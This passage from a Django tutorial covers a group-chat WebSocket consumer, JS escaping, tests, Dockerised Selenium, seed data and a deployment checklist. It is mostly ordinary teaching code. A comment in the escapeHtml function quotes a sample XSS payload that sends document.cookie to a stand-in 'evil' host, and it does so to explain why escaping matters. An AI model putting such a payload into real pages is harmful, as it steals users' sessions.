            # filter(user=user) is critical!
            # Without it: we'd reset the default for ALL users → Bob loses his default
        return Notebook.objects.create(
            user=user, title=title, color=color, is_default=is_default
        )


def toggle_pin_note(note):
    """Toggles is_pinned. Atomic UPDATE without loading the object."""
    Note.objects.filter(pk=note.pk).update(is_pinned=~models.F('is_pinned'))
    # ~F('is_pinned') = NOT is_pinned
    # One SQL UPDATE instead of SELECT + Python + UPDATE
    # Safe from race conditions (two users clicked at the same time)


def create_group(*, name, creator):
    """Creates a Django Group and adds the creator as the first member."""
    group = Group.objects.create(name=name)
    group.user_set.add(creator)   # M:N insert into auth_user_groups
    return group


def add_user_to_group(group, username):
    """Adds a user by username. Returns (success, error_message)."""
    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        return False, f'Користувача «{username}» не знайдено.'

    if group.user_set.filter(pk=user.pk).exists():
        return False, f'«{username}» вже є членом цієї групи.'

    group.user_set.add(user)
    return True, ''
```

### Context Processor — a sidebar without duplication

```python
# notes_app/context_processors.py
from django.db import OperationalError
from . import selectors


def sidebar_context(request):
    """
    Automatically adds sidebar data to EVERY template.
    Runs on every HTTP request for logged-in users.

    Without a context processor:
        def note_list(request): notebooks = selectors.get_user_notebooks(request.user)
        def note_create(request): notebooks = selectors.get_user_notebooks(request.user)
        def notebook_list(request): notebooks = selectors.get_user_notebooks(request.user)
        → 50+ views × 2 queries = 100+ duplications
    """
    if not request.user.is_authenticated:
        return {}

    try:
        # try/except OperationalError: protection against "a new migration isn't applied"
        # If you ran manage.py runserver without migrate after git pull
        # → the context processor won't crash with a 500, it returns {} → empty sidebar, but the site is alive
        return {
            'sidebar_notebooks': selectors.get_user_notebooks(request.user),
            'sidebar_tags': selectors.get_user_tags(request.user),
        }
    except OperationalError:
        return {}
```

---

## 10 · CONSUMERS

> **A Consumer** is the counterpart of a view, but it lives for the whole WebSocket connection.
> One Consumer object = one open browser connection.

### The full GroupChatConsumer

```python
# notes_app/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group
from .models import ChatMessage


class GroupChatConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for the group chat.

    URL: /ws/groups/<group_pk>/chat/
    Channel group: "chat_group_<group_pk>"

    Lifecycle:
        connect()      → authorization + membership check + group_add + history
        receive()      → save to DB + group_send (broadcast)
        chat_message() → send to OUR browser (we received a broadcast)
        disconnect()   → group_discard
    """

    # ── CONNECT ──────────────────────────────────────────────────────────────

    async def connect(self):
        # scope['user'] is set by AuthMiddlewareStack during the WS handshake:
        # reads the session cookie → SELECT FROM django_session → User object
        self.user = self.scope['user']

        # Not logged in → close without accept()
        # The browser receives a close frame, js: ws.onclose({code: 4403})
        if not self.user.is_authenticated:
            await self.close(code=4403)
            return

        # group_pk from the URL: /ws/groups/7/chat/ → {'group_pk': '7'}
        self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

        # Check membership via database_sync_to_async
        # (the ORM can't be called directly in an async context)
        is_member = await self.check_membership(self.group_pk, self.user)
        if not is_member:
            await self.close(code=4404)
            return

        # The name of the "broadcasting group" in the channel layer
        # All consumers of this group are subscribed to "chat_group_<pk>"
        self.room_group_name = f'chat_group_{self.group_pk}'

        # Add ourselves to the broadcasting group
        # self.channel_name = the unique ID of this consumer (UUID-like)
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name,
        )

        # MANDATORY: accept the connection
        # Without await self.accept() → the browser gets HTTP 403 (not WS 101)
        await self.accept()

        # Send the history (the last 50 messages)
        history = await self.load_history(self.group_pk)
        for msg in history:
            await self.send(text_data=json.dumps({
                'type': 'history',
                'author': msg['author__username'],
                'content': msg['content'],
                'timestamp': msg['timestamp'].isoformat(),
            }))

    # ── RECEIVE ───────────────────────────────────────────────────────────────

    async def receive(self, text_data):
        """The browser sent a message."""
        try:
            data = json.loads(text_data)
        except json.JSONDecodeError:
            return   # ignore invalid JSON

        content = data.get('content', '').strip()

        # Validation: not empty, no more than 2000 characters
        if not content or len(content) > 2000:
            return

        # Save to the DB (via a sync thread)
        msg = await self.save_message(self.group_pk, self.user, content)

        # Broadcast to ALL subscribers: every chat participant's consumer will receive
        # the event and call the chat_message() method
        await self.channel_layer.group_send(
            self.room_group_name,
            {
                'type': 'chat_message',     # → Django Channels → the chat_message() method
                'author': self.user.username,
                'content': content,
                'timestamp': msg.timestamp.isoformat(),
                'message_id': msg.pk,
            }
        )

    # ── CHAT_MESSAGE ──────────────────────────────────────────────────────────

    async def chat_message(self, event):
        """
        We received a broadcast from the channel layer.
        Task: send the JSON to OUR browser.

        This method is called both for the sender and for all recipients.
        'type': 'chat_message' → Django Channels looks for the chat_message() method
        (underscore ↔ dot: 'chat.message' → the chat_message method)
        """
        await self.send(text_data=json.dumps({
            'type': 'message',
            'author': event['author'],
            'content': event['content'],
            'timestamp': event['timestamp'],
            'message_id': event['message_id'],
        }))

    # ── DISCONNECT ────────────────────────────────────────────────────────────

    async def disconnect(self, close_code):
        """
        The browser closed the connection (tab closed, logout, internet dropped).

        MANDATORY: group_discard, so the channel layer stops sending events
        to this consumer. Without it → the channel layer tries to deliver → error.

        close_code:
            1000 = normal closure (tab closed)
            1001 = the page is navigating away
            1006 = abnormal closure (internet dropped)
        """
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(
                self.room_group_name,
                self.channel_name,
            )

    # ── DATABASE HELPERS ──────────────────────────────────────────────────────

    @database_sync_to_async
    def check_membership(self, group_pk, user):
        """Check whether user is a member of group group_pk."""
        try:
            group = Group.objects.get(pk=group_pk)
            return group.user_set.filter(pk=user.pk).exists()
        except Group.DoesNotExist:
            return False

    @database_sync_to_async
    def load_history(self, group_pk):
        """
        Load the last 50 messages.

        CRITICAL: we return a list, not a QuerySet!
        A QuerySet is lazy and bound to the thread where it was created.
        If you return a QuerySet and iterate it in an async context:
            → SynchronousOnlyOperation or the data isn't loaded

        list(qs.values(...)) runs the SQL HERE, in the worker thread → safe.
        """
        qs = (
            ChatMessage.objects
            .filter(group_id=group_pk)
            .select_related('author')
            .order_by('-timestamp')[:50]
        )
        msgs = list(qs.values('author__username', 'content', 'timestamp'))
        msgs.reverse()   # chronological order (was DESC for LIMIT, now ASC)
        return msgs

    @database_sync_to_async
    def save_message(self, group_pk, user, content):
        """Save the message to the DB."""
        return ChatMessage.objects.create(
            group_id=group_pk,
            author=user,
            content=content,
        )
```

### XSS protection in the JS client

```javascript
// static/notes_app/js/group_chat.js

function escapeHtml(text) {
    // MANDATORY for any user-generated content!
    // Without escapeHtml:
    //   data.content = '<img src=x onerror="fetch(evil+document.cookie)">'
    //   div.innerHTML = data.content → XSS → Session Hijacking of all chat participants
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

const ws = new WebSocket(
    `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws/groups/${groupPk}/chat/`
    // wss:// for HTTPS (ngrok), ws:// for HTTP (localhost)
);

ws.onmessage = function(e) {
    const data = JSON.parse(e.data);

    if (data.type === 'history' || data.type === 'message') {
        const div = document.createElement('div');
        div.classList.add('chat-message');

        // escapeHtml() for EVERY field from the server that contains user content:
        div.innerHTML = `
            <span class="author">${escapeHtml(data.author)}</span>
            <span class="content">${escapeHtml(data.content)}</span>
            <span class="time">${escapeHtml(data.timestamp)}</span>
        `;

        chatContainer.appendChild(div);
        chatContainer.scrollTop = chatContainer.scrollHeight;   // scroll down
    }
};

// Auto-reconnect:
ws.onclose = function(e) {
    if (e.code !== 1000 && e.code !== 1001) {
        // 1000 = normal, 1001 = navigation → don't reconnect
        // Other codes (1006 = failure) → reconnect after 3 seconds
        setTimeout(() => initWebSocket(), 3000);
    }
};
```

---

## 11 · TEST STRATEGY

> **5 levels of verification:** models → services → forms → views → consumers → selenium.

### What we test and where

```
notes_app/tests/
├── __init__.py          ← empty (required for a package)
├── test_models.py       ← constraints, __str__, SET_NULL, validators
├── test_services.py     ← CRUD, security, transactions, business rules
├── test_forms.py        ← validation, normalization, queryset security
├── test_views.py        ← HTTP codes, ownership, redirects, IDOR prevention
├── test_consumers.py    ← WebSocket auth, connect/receive/disconnect
└── test_selenium.py     ← E2E: browser forms, navigation
```

### test_consumers.py — WebSocket tests

```python
# notes_app/tests/test_consumers.py
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group, User
from django.test import TransactionTestCase  # not TestCase! The Consumer reads the DB from a separate thread
from notes_project.asgi import application


class GroupChatConsumerTest(TransactionTestCase):
    # TransactionTestCase, not TestCase:
    # TestCase wraps every test in a transaction with rollback.
    # An async consumer reads the DB from a separate worker thread → the TestCase transaction
    # is invisible to that thread → the data "disappears". TransactionTestCase doesn't wrap.

    def setUp(self):
        self.alice = User.objects.create_user('alice', password='pass123')
        self.bob   = User.objects.create_user('bob',   password='pass123')
        self.group = Group.objects.create(name='TestGroup')
        self.group.user_set.add(self.alice)
        # bob isn't added to the group → for the non-member test

    async def test_non_member_cannot_connect(self):
        """A user not in the group → the WebSocket is closed."""
        communicator = WebsocketCommunicator(
            application,
            f'/ws/groups/{self.group.pk}/chat/',
        )
        # Set the user in scope (AuthMiddlewareStack normally handles this)
        communicator.scope['user'] = self.bob

        connected, code = await communicator.connect()
        self.assertFalse(connected)
        # OR: connected=True but an immediate close with code 4404
        await communicator.disconnect()

    async def test_member_can_connect_and_receive_history(self):
        """A group member connects and receives the history."""
        # Add a test message to the DB
        from notes_app.models import ChatMessage
        await database_sync_to_async(ChatMessage.objects.create)(
            group=self.group,
            author=self.alice,
            content='Test message'
        )

        communicator = WebsocketCommunicator(
            application,
            f'/ws/groups/{self.group.pk}/chat/',
        )
        communicator.scope['user'] = self.alice

        connected, _ = await communicator.connect()
        self.assertTrue(connected)

        # The first message must be the history
        response = await communicator.receive_json_from()
        self.assertEqual(response['type'], 'history')
        self.assertEqual(response['content'], 'Test message')

        await communicator.disconnect()

    async def test_send_message_broadcasts_to_all(self):
        """A message from Alice reaches Bob."""
        self.group.user_set.add(self.bob)   # add Bob to the group

        # Two communicators = two browsers
        comm_alice = WebsocketCommunicator(application, f'/ws/groups/{self.group.pk}/chat/')
        comm_bob   = WebsocketCommunicator(application, f'/ws/groups/{self.group.pk}/chat/')

        comm_alice.scope['user'] = self.alice
        comm_bob.scope['user']   = self.bob

        await comm_alice.connect()
        await comm_bob.connect()

        # Alice sends
        await comm_alice.send_json_to({'content': 'Hello Bob!'})

        # Bob receives the broadcast
        bob_response = await comm_bob.receive_json_from()
        self.assertEqual(bob_response['type'], 'message')
        self.assertEqual(bob_response['content'], 'Hello Bob!')
        self.assertEqual(bob_response['author'], 'alice')

        await comm_alice.disconnect()
        await comm_bob.disconnect()
```

### Running tests — all the options

```bash
# ─── Through Docker (recommended) ──────────────────────────────────────────

# All unit + integration + consumer tests
docker compose run --rm web python manage.py test \
  notes_app.tests.test_models \
  notes_app.tests.test_services \
  notes_app.tests.test_forms \
  notes_app.tests.test_views \
  notes_app.tests.test_consumers \
  -v 2

# Selenium E2E tests (EXEC, not RUN!)
docker compose up -d                    # bring up the stack first
docker compose exec web python manage.py test notes_app.tests.test_selenium -v 2
# exec: uses the RUNNING container → the "web" DNS alias exists
# run:  a NEW container without the "web" alias → Selenium can't reach the live server!

# A specific class:
docker compose run --rm web python manage.py test \
  notes_app.tests.test_views.NoteListViewTest -v 2

# Stop at the first failure:
docker compose run --rm web python manage.py test notes_app.tests --failfast

# Coverage:
docker compose run --rm web sh -c "
  coverage run manage.py test notes_app.tests.test_models notes_app.tests.test_services notes_app.tests.test_forms notes_app.tests.test_views notes_app.tests.test_consumers
  coverage report --show-missing
"
```

---

## 12 · SELENIUM IN DOCKER

> **The difference from previous lessons:** here Selenium runs in a separate container
> (not locally). The Django test server and Chrome are in different containers — special configuration is needed.

### Problem: localhost ≠ localhost between containers

```
WITHOUT Docker Selenium (previous lessons):
  Runner VM: Django test server (localhost:PORT) + Chrome (localhost:PORT) ✓
  Chrome sees Django at localhost → OK

With Docker Selenium:
  web container: Django test server (localhost:PORT)
  selenium container: Chrome
    Chrome: http://localhost:PORT → NOT FOUND!
    localhost in the selenium container = the IP of the selenium container itself
    NOT the IP of the web container!
```

### Solution: \_DockerLiveServerMixin

```python
# notes_app/tests/test_selenium.py

class _DockerLiveServerMixin:
    """
    Lets Selenium in a Docker container see the Django test server.

    Problem: LiveServerTestCase usually binds to 127.0.0.1 (localhost only).
    Solution: bind to 0.0.0.0 (all interfaces) → reachable from the selenium container.

    It also replaces 0.0.0.0 with "web" in live_server_url:
    http://0.0.0.0:PORT → http://web:PORT
    "web" is the DNS name of the web container in the Docker network app-net.
    """
    host = '0.0.0.0'   # StaticLiveServerTestCase.host

    @property
    def live_server_url(self):
        url = super().live_server_url           # http://0.0.0.0:PORT
        web_host = os.environ.get('WEB_HOST')  # = "web" (from the docker-compose.yml env)
        if web_host:
            return url.replace('0.0.0.0', web_host)  # http://web:PORT
        return url


def _make_driver():
    """Returns a Chrome WebDriver: Remote (Docker) or local."""
    remote_url = os.environ.get('SELENIUM_REMOTE_URL')
    # = http://selenium:4444/wd/hub (from the docker-compose.yml env web.environment)

    if remote_url:
        # Docker: Chrome runs in the selenium container
        options = webdriver.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        # headless isn't needed: selenium/standalone-chrome is already headless
        return webdriver.Remote(
            command_executor=remote_url,
            options=options,
        )
    else:
        # Locally (without Docker): Chrome on the same machine
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        return webdriver.Chrome(options=options)


@unittest.skipUnless(SELENIUM_AVAILABLE, "selenium not installed")
class SeleniumLoginFlowTest(_DockerLiveServerMixin, StaticLiveServerTestCase):

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.driver = _make_driver()
        cls.driver.implicitly_wait(5)  # wait up to 5 sec for an element

    @classmethod
    def tearDownClass(cls):
        cls.driver.quit()
        super().tearDownClass()

    def _login_via_cookie(self):
        """Fast login via the session cookie (without the form)."""
        # 1. The Test Client creates a session in the DB
        self.client.force_login(self.user)
        session_cookie = self.client.cookies['sessionid']

        # 2. The browser must be on the domain before add_cookie
        self.driver.get(f'{self.live_server_url}/')

        # 3. Copy the session cookie into Selenium
        self.driver.add_cookie({
            'name': 'sessionid',
            'value': session_cookie.value,
            'path': '/',
        })
        # Now the driver is logged in = the same user as self.client
```

### VNC — watch the Selenium browser live

```bash
# If you want to see what Chrome is doing in the selenium container:
# http://localhost:7900  (password: secret)
# ↑ Opens a VNC viewer where you can see Chrome in real time

# Useful for debugging Selenium tests:
# - You see exactly what the driver finds
# - You see the state of forms on errors
# - You see JavaScript alerts and popups
```

---

## 13 · SEED DATA

> **seed_demo_data** is a management command that fills the DB with demo data for development.

### What seed_demo_data creates

```python
# notes_app/management/commands/seed_demo_data.py

# Creates three users:
#   demo_alice / demo1234
#   demo_bob   / demo1234
#   demo_carol / demo1234

# Creates a UserProfile for each

# Creates groups:
#   "Команда розробки" (alice + bob)
#   "Сімя" (alice + carol)

# Creates Notebooks for alice:
#   "Особисті" (default=True), "Робота", "Проєкти"

# Creates Tags for alice:
#   python (#3776AB), django (#092E20), ідеї (#FFD700)...

# Creates Notes (personal + group + archived + pinned)
# Creates TodoLists with TodoItems
# Creates ShoppingLists with ShopItems
# Creates ChatMessages for the group chats (history for the chat)
```

### Running seed_demo_data

```bash
# On the first run (the container starts automatically if SEED_DEMO_DATA=1):
docker compose up

# Manually (reset and refill):
docker compose exec web python manage.py seed_demo_data --reset
# --reset: deletes all existing data AND THEN fills it again
# (equivalent to docker compose down -v + up, but without destroying the volume)

# Check that the data is there:
docker compose exec web python manage.py shell -c "
from notes_app.models import Note
from django.contrib.auth.models import User
print(f'Users: {User.objects.count()}')
print(f'Notes: {Note.objects.count()}')
"
```

### .env configuration for dev

```bash
# .env (copy it from .env.example)

POSTGRES_DB=notes_db
POSTGRES_USER=notes_user
POSTGRES_PASSWORD=notes_password_dev

SECRET_KEY=dev-secret-key-not-for-production
DEBUG=True
ALLOWED_HOSTS=localhost,127.0.0.1

REDIS_URL=redis://redis:6379/0
DATABASE_URL=postgres://notes_user:notes_password_dev@db:5432/notes_db

# Seed demo data on startup
SEED_DEMO_DATA=1

# ngrok (needed only for public access)
NGROK_AUTHTOKEN=          # get it at ngrok.com
NGROK_DOMAIN=             # your static domain (ngrok free tier: 1 static domain)
```

---

## 14 · DEVELOPMENT

### Typical workflow

```bash
# ─── First run ─────────────────────────────────────────────────────────────
cp .env.example .env          # copy the configuration
# Edit .env: add NGROK_AUTHTOKEN and NGROK_DOMAIN if needed
docker compose up --build     # build + start all services
# Open http://localhost — login: demo_alice / demo1234

# ─── Daily development ─────────────────────────────────────────────────────
docker compose up             # bring up the stack (no rebuild if the Dockerfile hasn't changed)
docker compose logs -f web    # follow the Django logs

# After changing requirements.txt or the Dockerfile:
docker compose up --build     # rebuild the web container

# ─── Code changes (Python files) ───────────────────────────────────────────
# uvicorn --reload restarts automatically when .py files change
# (see in the logs: "Detected file change in notes_app/views.py")
# For templates (.html): reload the browser manually

# ─── A new migration ───────────────────────────────────────────────────────
docker compose exec web python manage.py makemigrations
docker compose exec web python manage.py migrate

# ─── Django shell ──────────────────────────────────────────────────────────
docker compose exec web python manage.py shell
>>> from notes_app.models import Note, User
>>> User.objects.count()

# ─── Stopping ──────────────────────────────────────────────────────────────
docker compose down           # stop (data in volumes is preserved)
docker compose down -v        # stop + remove volumes (reset the DB!)

# ─── Debug ─────────────────────────────────────────────────────────────────
docker compose ps             # status of all containers
docker compose logs nginx     # nginx logs (access + errors)
docker compose logs redis     # redis logs
docker network inspect notes_chat_app_app-net  # inspect the network
```

### Useful commands

```bash
# Django management commands:
docker compose exec web python manage.py check --deploy    # check production readiness
docker compose exec web python manage.py showmigrations     # migration state
docker compose exec web python manage.py createsuperuser    # admin access
docker compose exec web python manage.py dbshell           # psql to PostgreSQL
docker compose exec web python manage.py collectstatic     # collect static files manually

# PostgreSQL directly:
docker compose exec db psql -U notes_user -d notes_db
  \dt          → list of tables
  \d note      → schema of the note table
  \q           → exit

# Redis directly:
docker compose exec redis redis-cli
  KEYS *            → all keys
  TYPE channels:*   → key type
  TTL channels:*    → key TTL
  MONITOR           → live stream of all commands

# nginx:
docker compose exec nginx nginx -t      # check the config
docker compose restart nginx            # restart nginx
docker compose exec nginx curl -I http://web:8001/accounts/login/   # test the upstream
```

### Reading nginx logs

```
nginx-1  | 172.29.0.1 - - [13/Jun/2026:10:00:00 +0000] "GET /notes/ HTTP/1.1" 200 4523 "-" "Mozilla..."
          │             │                               │             │    │
          Client IP     Time                            Method+URL    Status  Bytes

nginx-1  | "GET /ws/groups/7/chat/ HTTP/1.1" 101 839
                                                  ↑ 101 = WebSocket upgrade SUCCESS

nginx-1  | "GET /static/admin/css/base.css HTTP/1.1" 304 0
                                                       ↑ 304 = Not Modified (the browser uses its cache)
```

---

## 15 · PRODUCTION CHECKLIST

### Security (mandatory)

- [ ] `SECRET_KEY` — unique, 50+ characters, generated with `get_random_secret_key()`
- [ ] `DEBUG = False` — **NEVER True in production**
- [ ] `ALLOWED_HOSTS` — specific domains, not `['*']`
- [ ] `CSRF_TRUSTED_ORIGINS` — contains the prod domain and the ngrok domain
- [ ] `SESSION_COOKIE_SECURE = True` — cookie over HTTPS only
- [ ] `CSRF_COOKIE_SECURE = True`
- [ ] `SECURE_SSL_REDIRECT = True` — HTTP → HTTPS redirect
- [ ] `SECURE_HSTS_SECONDS = 31536000` — HSTS for 1 year
- [ ] `.env` in `.gitignore` — check `git status` before pushing
- [ ] Passwords in `.env`, not in the code or the Dockerfile

### Performance

- [ ] Remove `--reload` from entrypoint.sh (uvicorn)
- [ ] Add `--workers 4` to uvicorn (4 = 2 × CPU cores)
- [ ] `CONN_MAX_AGE = 0` for ASGI (async-compatible)
- [ ] nginx `expires 7d` for static files (caching)
- [ ] PostgreSQL `max_connections` matches the number of uvicorn workers
- [ ] Redis `maxmemory-policy allkeys-lru` (don't let Redis fill up the RAM)

### Monitoring and logging

- [ ] `LOGGING` in settings.py → files or stdout for Docker
- [ ] nginx access log → analysis (Grafana Loki or ELK)
- [ ] Health check endpoints respond
- [ ] Uptime monitor (UptimeRobot, Better Stack)

### Deploy checklist

```bash
# Before git push:
docker compose run --rm web python manage.py check --deploy
# Checks: DEBUG, SECRET_KEY, ALLOWED_HOSTS, DATABASES, etc.
# If there is a WARNING → fix it before the production deploy

# Check that all tests are green:
docker compose run --rm web python manage.py test notes_app.tests --failfast

# Check migrate:
docker compose run --rm web python manage.py showmigrations
# All migrations must have [X]

# Check static files:
docker compose exec nginx curl -I http://localhost/static/admin/css/base.css
# HTTP/1.1 200 OK → nginx serves static files correctly
```

### Generating SECRET_KEY

```bash
# Option 1: Python
python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"

# Option 2: OpenSSL
openssl rand -base64 50

# Option 3: Python secrets
python -c "import secrets; print(secrets.token_urlsafe(50))"
```

### Common mistakes on the first deploy

| Error | Cause | Fix |
|---------|---------|-------------|
| `403 CSRF verification failed` | The domain isn't in CSRF_TRUSTED_ORIGINS | Add the domain in settings.py + env |
| `DisallowedHost` | The domain isn't in ALLOWED_HOSTS | Add the domain + restart |
| `WebSocket 403` | Auth isn't passed through nginx | Check proxy_set_header in nginx.conf |
| `Static files 404` | collectstatic didn't run | Check entrypoint.sh + the volume mount |
| `ERR_NGROK_8012` | ngrok can't find nginx | Check that both are in app-net |
| `TimeoutError reading from redis` | socket_timeout in RedisChannelLayer | socket_timeout=None in CONFIG |
| `CommandError: Demo data disabled` | seed_demo_data is disabled without DEBUG=True | Add --force to the command |

---

## Summary: what to look for and where

| Concept | Where in the code |
|-----------|-----------|
| **Docker Compose chain** | `docker-compose.yml` — depends_on + healthcheck |
| **PostgreSQL connection** | `notes_project/settings.py` — dj_database_url.parse |
| **Redis channel layer** | `settings.py` — CHANNEL_LAYERS with socket_timeout=None |
| **nginx WebSocket config** | `nginx/nginx.conf` — map $http_upgrade + proxy_http_version 1.1 |
| **Static volume** | `docker-compose.yml` staticfiles volume + nginx alias /staticfiles |
| **CSRF + ngrok** | `settings.py` — CSRF_TRUSTED_ORIGINS from the NGROK_DOMAIN env |
| **entrypoint.sh chain** | `entrypoint.sh` — migrate → collectstatic → seed → uvicorn |
| **Consumer lifecycle** | `notes_app/consumers.py` — connect/receive/chat_message/disconnect |
| **database_sync_to_async** | `consumers.py` — check_membership, load_history, save_message |
| **XSS protection in JS** | `static/notes_app/js/group_chat.js` — escapeHtml() |
| **IDOR protection** | `notes_app/views.py` — get_object_or_404(Note, pk=pk, user=request.user) |
| **Group Q-filter** | `notes_app/selectors.py` — Q(user=user) \| Q(group__in=user_groups) |
| **Seed data** | `notes_app/management/commands/seed_demo_data.py` |
| **Docker Selenium** | `tests/test_selenium.py` — _DockerLiveServerMixin + SELENIUM_REMOTE_URL |
| **Consumer tests** | `tests/test_consumers.py` — WebsocketCommunicator |

---

## Module documentation

| File | Topic |
|------|------|
| [`../05_authentication.md`](05_authentication.md) | AuthN vs AuthZ, sessions, IDOR, Django Groups |
| [`../06_testing.md`](06_testing.md) | Unit/Integration/E2E tests, the AAA pattern |
| [`../07_async.md`](07_async.md) | ASGI, Channels, Consumer, channel layer |
| [`../08_deployment.md`](08_deployment.md) | Docker Compose, nginx, ngrok, production checklist |
| [`../README_6.md`](README_6.md) | Auth — a detailed tutorial with code |
| [`../README_7.md`](README_7.md) | Testing — a detailed tutorial with CI/CD |
| [`../README_8.md`](README_8.md) | Async — sync vs async comparison |
| [`../../docs/09_async_and_realtime/README.md`](../../docs/09_async_and_realtime/README.md) | Async theory |
| [`../../docs/11_deployment/README.md`](../../docs/11_deployment/README.md) | Deployment theory |
| [`../../docs/12_final_project/README.md`](../../docs/12_final_project/README.md) | Final project overview |
